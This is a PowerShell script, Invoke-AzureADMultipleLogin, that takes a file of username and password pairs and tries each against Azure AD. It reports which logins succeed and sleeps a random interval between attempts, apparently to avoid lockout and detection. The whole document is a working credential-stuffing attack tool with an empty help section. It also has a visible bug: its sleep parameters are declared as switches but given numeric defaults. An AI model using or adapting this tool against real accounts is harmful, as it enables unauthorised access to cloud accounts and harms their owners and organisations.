# Invoke-AzureADMultipleLogin.ps1
#
# Accepts a list of credentials of the form
# azure_username:ad_username:password
# as a file.

Function Invoke-AzureADMultipleLogin
{
<#
    .SYNOPSIS
        .DESCRIPTION
        
    .PARAMETER CredentialFile

    .PARAMETER RandomizeOrder

    .PARAMETER RandomSleepMin

    .PARAMETER RandomSleepMax

    .EXAMPLE
    
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="File containing a list of credentials.")]
        [string] $CredentialFile,

        [Parameter(HelpMessage="Randomize the credential order.")]
        [switch] $RandomizeOrder = $false,

        [Parameter(HelpMessage="Random sleep minimum seconds.")]
        [switch] $RandomSleepMin = 120,

        [Parameter(HelpMessage="Random sleep maximum seconds.")]
        [switch] $RandomSleepMax = 300
    )

    [string[]]$credentials = Get-Content -Path $CredentialFile
    $num_credentials = $credentials.Count
    Write-Host "[*] Parsed "$num_credentials" credentials" -ForegroundColor yellow 

    # randomize credentials
    if($RandomizeOrder) {
        $credentials = $credentials | Get-Random -Count ([int]::MaxValue)
    }
    
    $credentials_processed = 0
    foreach($cred in $credentials)
    {
        $account, $ad_user, $pass = $cred.split(':', 3)
        $secure_pass = ConvertTo-SecureString -String $pass -AsPlainText -Force

        $azuread_cred = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $account, $secure_pass

        # attempt to authenticate to AzureAD
        $account_id = $null
        try {
            Connect-AzureAD -Credential $azuread_cred -ErrorAction SilentlyContinue
            $session = Get-AzureADCurrentSessionInfo
            $account_id = $session.Account.Id
            #Write-Host $account
            #Write-Host $ad_user
            #Write-Host $pass
        }
        catch {
            $failure_reason = $Error[0].CategoryInfo.Reason
            if($failure_reason -eq "AadAuthenticationFailedException") {
                Write-Host "[-] Failed login to "$account" ("$ad_user")" -ForegroundColor red
            }
            else {
                Write-Host "[-] Unhandled failure reason "$failure_reason" for "$account -ForegroundColor red
            }  
        }

        if($account_id -ne $null) {
            Write-Host "[+] Successful login to "$account" ("$ad_user")" -ForegroundColor green
            Disconnect-AzureAD
        }
        $random_sleep = Get-Random -Maximum $RandomSleepMax -Minimum $RandomSleepMin
        Write-Host "[*] sleeping "$random_sleep"s" -ForegroundColor yellow
        Start-Sleep -Seconds $random_sleep
        $credentials_processed += 1
        if ($credentials_processed % 100 -eq 0) {
            Write-Host "[*] processed "$credentials_processed"/"$num_credentials" credentials" -ForegroundColor yellow
        }
    }
}